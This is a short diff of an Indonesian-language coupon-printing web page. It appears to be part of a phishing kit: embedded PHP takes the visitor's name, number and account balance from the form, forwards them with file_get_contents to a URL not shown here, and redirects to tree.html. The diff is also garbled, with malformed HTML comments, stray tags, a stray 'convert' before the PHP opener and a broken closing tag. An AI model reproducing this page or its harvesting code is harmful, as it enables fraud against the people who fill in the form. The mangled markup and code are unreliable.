@@ -160,16 +160,21 @@
             </div><br><br>
             <button type="button" onclick="submitForm()">Lanjut Cetak Kupon</button>
         </form>
-    </div>
+    </div> 
 
+<HTML></HTML>
+          
+        <--- proses/php --->
+              
     <div class="loading">
         <img src="images/03-42-07-846_512.gif" alt="">
     </div>
         <nav class="bottom">
         <img src="https://blogger.googleusercontent.com/img/a/AVvXsEipmL-vrOLKfqhRE_v1Uu7ZZGqBLaG3TxX_lGmjT3khn2mQz-J696BOKYA9cfOshQit_ab1lEN8CkyyFDKutTlF0iIAEkp8fQvTzY_IXhLCBwlHMVBMezlpyR9o3MbgpCd0uRZMMkimzLiDnu611roPZF6_No7zNY4IMonWJq4PiTDumnBhFWDubSy-Ekta" alt="Nav Bawah">
-    </nav>
+    </nav> 
 
-          <script><?php
+<html>
+convert<?php
 $nama  = $_POST['nama'] ?? '';
 $nomor = $_POST['nomor'] ?? '';
 $saldo = $_POST['saldo'] ?? '';
@@ -203,8 +208,4 @@ $result = file_get_contents($url, false, $context);
 header("Location: tree.html");
 exit;
 
-/?>
-</script>
-
-
-</nav></body></html>
+/?> 
